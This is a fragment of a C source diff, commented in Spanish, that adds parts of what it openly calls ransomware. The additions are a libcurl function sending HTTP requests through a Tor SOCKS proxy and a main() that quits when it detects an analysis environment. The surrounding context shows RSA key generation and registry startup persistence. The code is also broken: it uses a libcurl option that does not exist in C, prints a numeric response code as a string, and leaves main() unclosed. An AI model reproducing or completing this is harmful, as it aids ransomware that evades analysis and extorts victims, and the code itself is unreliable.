@@ -103,6 +103,47 @@ void generate_rsa_keys(RSA **rsa_private, RSA **rsa_public) {
     BIO_free(bio_private);
 }
 
+// Función para hacer una solicitud HTTP a través de Tor
+void make_request_through_tor(const char *url) {
+    CURL *curl;
+    CURLcode res;
+
+    // Inicializar libcurl
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+    if(curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); // Puerto por defecto de Tor
+        curl_easy_setopt(curl, CURLOPT_RETURNTRANSFER, 1L);
+        
+        // Realizar la solicitud
+        res = curl_easy_perform(curl);
+        
+        // Comprobar errores
+        if(res != CURLE_OK) {
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        } else {
+            char *response;
+            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response);
+            printf("Response code: %s\n", response);
+        }
+
+        // Limpiar
+        curl_easy_cleanup(curl);
+    }
+    curl_global_cleanup();
+}
+
+int main() {
+    // Inicializar Tor
+    // Asegúrate de que Tor esté corriendo antes de hacer la solicitud
+
+    srand(time(NULL));  // Semilla para la aleatoriedad
+    if (is_in_analysis_environment()) {
+        printf("Entorno de análisis detectado. Salida.\n");
+        return 0;
+    }
+
 // Agrega persistencia al ransomware en el sistema
 void add_to_startup() {
     HKEY hKey;
